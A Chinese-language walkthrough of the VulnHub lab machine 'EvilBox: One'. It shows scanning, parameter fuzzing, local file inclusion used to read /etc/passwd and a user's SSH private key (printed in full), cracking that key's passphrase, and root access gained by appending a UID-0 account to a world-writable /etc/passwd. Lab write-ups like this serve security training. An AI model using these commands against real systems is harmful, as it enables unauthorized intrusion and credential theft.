# EvilBox: One

2024-5-24 https://www.vulnhub.com/entry/evilbox-one,736/

difficulty: Easy

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 4495500be473a18511ca10ec1ccbd426 (RSA)
|   256 27db6ac73a9c5a0e47ba8d81ebd6d63c (ECDSA)
|_  256 e30756a92563d4ce3901c19ad9fede64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
```

只有 80 web，主页是 apache 默认页面，使用 gobuster 看看有什么。

http://192.168.5.30/robots.txt 提示: Hello H4x0r , 看上去像是个用户名。

http://192.168.5.30/secret/ 发现这个目录，再次基于这个目录进行爆破，发现页面：

```
http://192.168.5.30/secret/evil.php
```

但是什么都没输出，估计是缺少参数，进行 FUZZ：

```
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.30/secret/evil.php?FUZZ=/etc/passwd -fs 0
```

发现参数 command，拼接后，看看能不能执行 RCE 或者是 LFI：

```
curl -G --data-urlencode "command=/etc/passwd" http://192.168.5.30/secret/evil.php
```

发现用户 mowree。

经过验证发现存在 LFI，继续 FUZZ，看看有哪些 linux 系统文件能读取到：

```
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.30/secret/evil.php?command=FUZZ -fs 0
```

没读取到 ssh 或者 apache 的日志文件，不能在日志中写入 webshell，看看 mowree 用户中有没有.ssh/id_rsa 吧：

```
curl -G --data-urlencode "command=/home/mowree/.ssh/id_rsa" http://192.168.5.30/secret/evil.php

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

得到私钥，保存到 kali 上，chmod 600 尝试 ssh 登陆，但是提示私钥有密码，还是使用 john + rockyou 尝试破解密钥，得到密钥: unicorn

登陆后，得到 user.txt：

```
mowree@EvilBoxOne:~$ cat user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ
```

寻找提权到 root 的路径，sudo、suid、crontab、cap 都没发现有价值信息。

发现 /etc/passwd 对所有用户有可写权限，可以将新的 root 用户写入到其中：

```
mowree@EvilBoxOne:/tmp$ ls -al /etc/passwd
-rw-rw-rw- 1 root root 1398 ago 16  2021 /etc/passwd
mowree@EvilBoxOne:/tmp$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
mowree@EvilBoxOne:/tmp$ echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
mowree@EvilBoxOne:/tmp$ su new
Contraseña:
root@EvilBoxOne:/tmp# cd /root
root@EvilBoxOne:~# ls -al
total 24
drwx------  3 root root 4096 ago 16  2021 .
drwxr-xr-x 18 root root 4096 ago 16  2021 ..
lrwxrwxrwx  1 root root    9 ago 16  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 ago 16  2021 .bashrc
drwxr-xr-x  3 root root 4096 ago 16  2021 .local
-rw-r--r--  1 root root  148 ago 17  2015 .profile
-r--------  1 root root   31 ago 16  2021 root.txt
root@EvilBoxOne:~# cat root.txt
36QtXfdJWvdC0VavlPIApUbDlqTsBM
```
